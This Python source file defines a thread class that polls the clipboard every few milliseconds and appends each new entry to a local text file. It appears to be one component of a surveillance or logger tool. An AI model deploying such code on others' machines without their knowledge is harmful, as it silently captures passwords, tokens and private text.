from time import sleep
from os import remove, path
from threading import Thread

from pyperclip import paste


class ClipboardLogger(Thread):

    def __init__(self, storage_path: str, storage_folder: str,):
        Thread.__init__(self, name="clipboard")

        self.clipboard = str

        self.storage_path = storage_path
        self.storage_folder = storage_folder

    def __check_clipboard(self):

        self.current_clipboard = paste()

        if self.current_clipboard != self.clipboard:

            self.__log_clipboard()
            self.clipboard = self.current_clipboard

    def __log_clipboard(self):

        with open(f'{self.storage_path}{self.storage_folder}clipboard_logger.txt', 'a', encoding='utf-8') as self.clipboard_logger:
            self.clipboard_logger.write(self.current_clipboard + "\n")

    def clear(self):

        if path.exists(f'{self.storage_path}{self.storage_folder}clipboard_logger.txt'):

            try:

                self.clipboard_logger.close()

            except:

                pass

            remove(f'{self.storage_path}{self.storage_folder}clipboard_logger.txt')
            self.clipboard = ''

    def run(self):

        while True:
            self.__check_clipboard()
            sleep(0.005)
